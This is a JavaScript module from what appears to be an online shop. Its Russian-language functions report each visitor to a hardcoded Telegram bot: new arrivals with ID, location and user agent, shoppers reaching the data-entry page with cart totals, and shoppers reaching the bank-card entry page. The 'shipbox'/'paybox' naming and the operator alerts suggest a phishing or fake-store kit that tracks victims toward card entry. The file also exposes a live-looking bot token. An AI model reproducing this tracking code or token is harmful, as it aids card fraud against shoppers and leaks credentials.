// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = "8551615963:AAEOPXbeNy48cyh8zNW5ede7-v3w8RWldHE";
const TELEGRAM_CHAT_ID = -1003217055373;

// Get client ID from localStorage
const getClientId = () => {
  return localStorage.getItem('clientId') || 'Unknown';
};

// Get cart total
const getCartTotal = () => {
  try {
    const cart = JSON.parse(localStorage.getItem('cart') || '[]');
    const total = cart.reduce((sum, item) => sum + (item.Price * (item.qty || 1)), 0);
    return total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  } catch (error) {
    return '0.00';
  }
};

// Get user country (from backend or default)
const getUserCountry = () => {
  // Try to get from backend response if available
  const userData = sessionStorage.getItem('userData');
  if (userData) {
    try {
      const data = JSON.parse(userData);
      return data.country || 'Unknown';
    } catch (e) {
      return 'Unknown';
    }
  }
  // Try to detect from timezone
  try {
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return timeZone || 'Unknown';
  } catch (e) {
    return 'Unknown';
  }
};

// Get user agent
const getUserAgent = () => {
  return navigator.userAgent || 'Unknown';
};

// Format time
const getFormattedTime = () => {
  const now = new Date();
  return now.toLocaleString('en-US', {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });
};

// Send message to Telegram
const sendTelegramMessage = (message) => {
  try {
    console.log('[Telegram] Sending message...');
    console.log('[Telegram] Bot Token:', TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
    console.log('[Telegram] Chat ID:', TELEGRAM_CHAT_ID);
    
    const encodedMessage = encodeURIComponent(message);
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
    
    console.log('[Telegram] URL:', url.substring(0, 80) + '...');
    
    // Use fetch API with XMLHttpRequest fallback
    fetch(url)
      .then(response => {
        console.log('[Telegram] Response status:', response.status);
        return response.json();
      })
      .then(data => {
        console.log('[Telegram] Full response:', data);
        if (data.ok) {
          console.log('[Telegram] ✅ Message delivered to Telegram successfully!');
        } else {
          console.error('[Telegram] ❌ Error from Telegram API:', data);
          console.error('[Telegram] Error description:', data.description);
          console.error('[Telegram] Error code:', data.error_code);
        }
      })
      .catch(error => {
        console.error('[Telegram] ❌ Fetch error:', error);
        console.log('[Telegram] Trying fallback method (XMLHttpRequest)...');
        
        // Fallback to XMLHttpRequest if fetch fails
        const xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        
        xhr.onload = function() {
          console.log('[Telegram] [Fallback] Response status:', xhr.status);
          if (xhr.status === 200) {
            try {
              const response = JSON.parse(xhr.responseText);
              console.log('[Telegram] [Fallback] Full response:', response);
              if (response.ok) {
                console.log('[Telegram] ✅ [Fallback] Message delivered successfully!');
              } else {
                console.error('[Telegram] ❌ [Fallback] Error:', response);
                console.error('[Telegram] [Fallback] Error description:', response.description);
              }
            } catch (e) {
              console.error('[Telegram] ❌ [Fallback] Parse error:', e);
              console.error('[Telegram] [Fallback] Raw response:', xhr.responseText);
            }
          } else {
            console.error('[Telegram] ❌ [Fallback] Failed with status:', xhr.status);
            console.error('[Telegram] [Fallback] Response:', xhr.responseText);
          }
        };
        
        xhr.onerror = function() {
          console.error('[Telegram] ❌ [Fallback] Network error occurred');
        };
        
        xhr.ontimeout = function() {
          console.error('[Telegram] ❌ [Fallback] Request timeout');
        };
        
        xhr.timeout = 10000;
        xhr.send();
      });
    
    console.log('[Telegram] Request sent');
  } catch (error) {
    console.error('[Telegram] ❌ Error sending Telegram message:', error);
    console.error('[Telegram] Error stack:', error.stack);
  }
};

// Send new user alert
export const sendNewUserAlert = (userData = {}) => {
  console.log('[Telegram] sendNewUserAlert called');
  const clientId = getClientId();
  const country = userData.country || getUserCountry();
  const userAgent = getUserAgent();
  const time = getFormattedTime();
  
  const message = `🆕 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ</b>

━━━━━━━━━━━━━━━━━━━━

🆔 <b>ID:</b> <code>${clientId}</code>
🌍 <b>Country:</b> <code>${country}</code>
📱 <b>User-Agent:</b> <code>${userAgent.substring(0, 80)}${userAgent.length > 80 ? '...' : ''}</code>
⏰ <b>Time:</b> <code>${time}</code>`.trim();

  console.log('[Telegram] New user message:', message);
  sendTelegramMessage(message);
};

// Send checkout page alert (shipbox)
export const sendCheckoutPageAlert = () => {
  console.log('[Telegram] sendCheckoutPageAlert called');
  const clientId = getClientId();
  const cartTotal = getCartTotal();
  
  const message = `📝 <b>Клиент [${clientId.substring(0, 12)}...] находится на странице заполнения данных</b>

━━━━━━━━━━━━━━━━━━━━

💰 <b>Сумма корзины:</b> <code>$${cartTotal}</code>`.trim();

  console.log('[Telegram] Checkout page message:', message);
  sendTelegramMessage(message);
};

// Send payment page alert (paybox)
export const sendPaymentPageAlert = () => {
  console.log('[Telegram] sendPaymentPageAlert called');
  const clientId = getClientId();
  
  const message = `💳 <b>Клиент [${clientId.substring(0, 12)}...] перешёл на страницу оплаты</b>

━━━━━━━━━━━━━━━━━━━━

🔐 <b>Страница:</b> Ввод данных банковской карты`.trim();

  console.log('[Telegram] Payment page message:', message);
  sendTelegramMessage(message);
};

// Test function - можно вызвать из консоли браузера
export const testTelegramSend = () => {
  console.log('[Telegram] TEST: Sending test message...');
  const testMessage = `🧪 <b>ТЕСТОВОЕ СООБЩЕНИЕ</b>

━━━━━━━━━━━━━━━━━━━━

🆔 <b>ID:</b> <code>TEST_${Date.now()}</code>
⏰ <b>Time:</b> <code>${getFormattedTime()}</code>
✅ <b>Status:</b> Если вы видите это сообщение, Telegram уведомления работают!`.trim();
  
  sendTelegramMessage(testMessage);
};

// Make test function available globally for easy testing
if (typeof window !== 'undefined') {
  window.testTelegram = testTelegramSend;
  console.log('[Telegram] Test function available: window.testTelegram()');
}

const telegramUtils = {
  sendNewUserAlert,
  sendCheckoutPageAlert,
  sendPaymentPageAlert,
  testTelegramSend
};

export default telegramUtils;

